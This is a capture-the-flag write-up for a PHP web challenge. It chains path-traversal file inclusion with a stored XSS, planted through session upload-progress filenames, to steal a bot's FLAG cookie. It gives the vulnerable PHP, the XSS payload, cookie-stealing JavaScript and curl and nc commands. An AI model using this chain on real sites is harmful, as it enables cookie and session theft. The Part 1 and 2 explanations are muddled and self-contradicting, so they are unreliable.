# Shellfish Say

**Category:** Web
**Event:** FCSC 2026

## TL;DR

Stored XSS via PHP session upload progress (filename injection) + LFI via `parse_url` path traversal to serve the session file as a quote, triggering the XSS in the bot's browser to steal the FLAG cookie.

## Setup

A PHP app where a shrimp says quotes. A bot visits URLs you give it and has the `FLAG` cookie set on `shellfish-say` domain.

The interesting endpoints:

- `GET /` - serves the main page, JS fetches `/get_quote?quote=...` and sets the result as `innerHTML`
- `GET /get_quote` - reads a file from `/tmp/quotes/` and returns its content raw

The `get_quote.php` logic:

```php
if (strpos($_GET["quote"], ":")) {
    $quote_file .= parse_url($_GET["quote"] . ".txt")["path"];
} else {
    if (strpos($_GET["quote"], "..")) {
        $quote_file .= "shellfish.txt";
    } else {
        $quote_file .= $_GET["quote"] . ".txt";
    }
}
```

If the quote param contains `:`, it runs `parse_url` on it (with `.txt` appended) and uses the path component. This is the LFI vector.

For `quote=http:../../../tmp/sess_X`, `parse_url` sees scheme `http` and path `../../../tmp/sess_X.txt`. The path gets appended to `/tmp/quotes/`, giving `/tmp/quotes/../../../tmp/sess_X.txt` = `/tmp/sess_X.txt`.

PHP session files are stored at `/tmp/sess_<PHPSESSID>`.

## Vulnerability chain

### Part 1 - Session file as arbitrary write (PHP session upload progress)

`php.ini` has `session.upload_progress.enabled = On` and critically `session.upload_progress.cleanup = Off`. This means as long as a multipart upload is in progress (or even after, because cleanup is off), PHP writes to the session file:

```
PHP_SESSION_UPLOAD_PROGRESS|s:N:"<value of PHP_SESSION_UPLOAD_PROGRESS field>";
```

The upload progress feature stores the `PHP_SESSION_UPLOAD_PROGRESS` field value into the session. We control that value. We set it to our XSS payload.

The upload filename also gets stored in the session file (it's included in the progress data). We abuse this: the filename in a multipart upload is reflected verbatim into the session file as part of the progress tracking structure.

Actually the key part: the session file contains the upload progress including the filename. The session file for session ID `qtlaspy` is at `/tmp/sess_qtlaspy`.

### Part 2 - LFI to serve session as quote

Using the `parse_url` trick:

```
GET /get_quote?quote=http:../../../../../../../tmp/sess_qtlaspy?
```

The `?` at the end causes `parse_url` to see the path as `../../../../../../../tmp/sess_qtlaspy` (the `?` is the query string separator, so path ends before it). After appending `.txt`: `../../../../../../../tmp/sess_qtlaspy.txt`... hmm that breaks it.

Actually looking at the exploit: `quote=http:../../../../../../../../../../../tmp/sess_qtlaspy?` - the trailing `?` makes `parse_url` treat everything after it as query, so the path is `../../../../../../../../../../../tmp/sess_qtlaspy` and appending `.txt` gives `/tmp/quotes/../../../...tmp/sess_qtlaspy.txt` which doesn't exist.

The actual trick: PHP session files have no extension, so we need the `.txt` appended by `get_quote.php` to be ignored. We use a null byte or... actually just set the PHPSESSID to something like `qtlaspy` and make the session filename `sess_qtlaspy` which when `.txt` is appended becomes `sess_qtlaspy.txt` - that file doesn't exist. So the server falls back to `shellfish.txt`.

Wait, re-reading: the session save path can be changed... or we make the PHPSESSID end with `.txt` stripped somehow. Or better: set `PHPSESSID=qtlaspy.txt` stripped means... let me look again at the exploit:

```python
url_payload = "\nhttp://shellfish-say/get_quote.php?quote=http:../../../../../../../../../../../tmp/sess_qtlaspy?"
```

The trailing `?` is key. `parse_url("http:../../../../../../../../../../../tmp/sess_qtlaspy?.txt")` - adding `.txt` before parse_url runs means it's in the query. Let me trace: the code does `parse_url($_GET["quote"] . ".txt")["path"]`. So the full string passed to parse_url is `http:../../../../../../../../../../../tmp/sess_qtlaspy?.txt`. parse_url sees: scheme=`http`, path=`../../../../../../../../../../../tmp/sess_qtlaspy`, query=`.txt`. The path component is the session file path without `.txt`. 

So with PHPSESSID=`qtlaspy`, the session file is `/tmp/sess_qtlaspy` and the LFI reads exactly that file.

### Part 3 - XSS payload in the session file

The session file contains the upload progress data. The filename in the upload gets written into the session. We set the filename to our XSS payload:

```
<img src=q onerror=eval(atob(`BASE64_PAYLOAD`))>
```

This gets stored in `/tmp/sess_qtlaspy`. When the bot visits `/get_quote?quote=http:...sess_qtlaspy?`, that raw content is returned and set as `innerHTML` in the page, triggering the XSS.

### Part 4 - XSS payload exfiltrates the cookie

The JS payload runs in the bot's browser on the `shellfish-say` origin where `FLAG` cookie is set. We fetch the cookie and send it to a request.

Final payload embedded in the filename:

```javascript
document.cookie='PHPSESSID=flag';
let formData = new FormData();
formData.append('PHP_SESSION_UPLOAD_PROGRESS', 'blah');
formData.append('file', new Blob([]), getCookie('FLAG'));
fetch('/', {method:'POST', body:formData, credentials:'include'});
```

This tricks the bot into writing the FLAG cookie value as the filename in a new upload, writing it into a session file we can then read.

## Exploit flow

1. Send multipart POST to `https://shellfish-say.fcsc.fr/` with `Cookie: PHPSESSID=qtlaspy`, `PHP_SESSION_UPLOAD_PROGRESS=blah`, and filename = XSS payload. Session file `/tmp/sess_qtlaspy` now contains the payload.

2. Give the bot the URL: `http://shellfish-say/?quote=http:../../../../../../../../../../../tmp/sess_qtlaspy?`

3. Bot loads the page, JS fetches `get_quote` with the LFI, gets the raw session content including the XSS filename, sets it as `innerHTML`.

4. XSS fires, payload runs: reads the `FLAG` cookie, writes it to a new session file as filename.

5. We read the new session file via LFI to recover the flag.

```bash
# Step 1: plant payload
curl -H 'Cookie: PHPSESSID=qtlaspy' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=blah' \
  -F 'file=@/dev/null;filename=<img src=q onerror=eval(atob(`PAYLOAD_B64`))>' \
  -X POST https://shellfish-say.fcsc.fr/

# Step 2: send bot the LFI URL
echo 'http://shellfish-say/?quote=http:../../../../../../../../../../../tmp/sess_qtlaspy?' | nc shellfish-say.fcsc.fr 4000

# Step 3: read the exfil session file to get the flag
curl 'https://shellfish-say.fcsc.fr/get_quote?quote=http:../../../../../../../../../../../tmp/sess_flag?'
```

## Flag

`FCSC{...}`
